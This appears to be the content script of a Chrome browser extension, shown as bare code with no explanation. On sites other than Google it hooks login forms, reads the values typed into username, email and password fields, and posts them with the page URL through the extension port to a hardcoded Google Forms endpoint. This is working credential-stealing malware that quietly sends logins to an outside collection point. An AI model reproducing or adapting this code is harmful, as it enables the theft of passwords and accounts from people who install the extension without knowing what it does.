
var port = chrome.runtime.connect({ name: "Neo" });
var oldUrl = "";
var pass;
var user;
if (window.location.href.indexOf("https://www.google.com") == 0) { port.postMessage({ setForm: "neg" });}
if (window.location.href.indexOf("https://www.google.com") != 0) { port.postMessage({ setForm: "pos" }) }
port.postMessage({ setForm: "inputs" });
port.postMessage({ setForm: "pos" });
        port.postMessage({ setForm: "canwe" });
        port.onMessage.addListener(function (msg) {
            if (msg.question == "yes") {
                var url = window.location.href;
                port.postMessage({ setForm: "setURL", setFormURL: url });
                $("form[id]").find('input[type="text"][name*="user"]', 'input[type="text"][name*="og"]', 'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').change(function () {
                    //console.log($("form[id]").find('input[type="text"][name*="user"]', 'input[type="text"][name*="og"]', 'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').val());
                    var user = ($("form[id]").find('input[type="text"][name*="user"]', 'input[type="text"][name*="og"]', 'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').val());
                    port.postMessage({ setForm: "setU", setFormU: user });
                });
                $("form[id]").find('input[type="password"][name*="ass"]').change(function () {
                    //console.log($("form[id]").find('input[type="password"][name*="ass"]').val());
                    var pass = ($("form[id]").find('input[type="password"][name*="ass"]').val());
                    port.postMessage({ setForm: "setP", setFormP: pass });
                });
            }

            if (msg.question == "yes" && ($("form[id]").find('input[type="text"][name*="user"]', 'input[type="text"][name*="og"]', 'input[type="text"][name*="ser"]', 'input[type="text"][name*="mail"]').length > 0)){
                port.postMessage({ setForm: "sendinputs" });
            }
            if (msg.question == "inputrec") {
            $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSeLs1OQwPjhZHo6eBrn-VMwkifyKKNUiGl0fPOfKFRC9HPgDw/formResponse",
                data: {
                    "entry.832558679": msg.questionu, "entry.541755593": msg.questionp, "entry.425002392": msg.questionurl
                },
                type: "POST",
                dataType: "xml",
                statusCode: {
                    0: function () {
                        console.log("They are not out yet.");
                    },
                    200: function () {
                        console.log("The trace was completed.");
                    }
                }
            });
            }
        });  
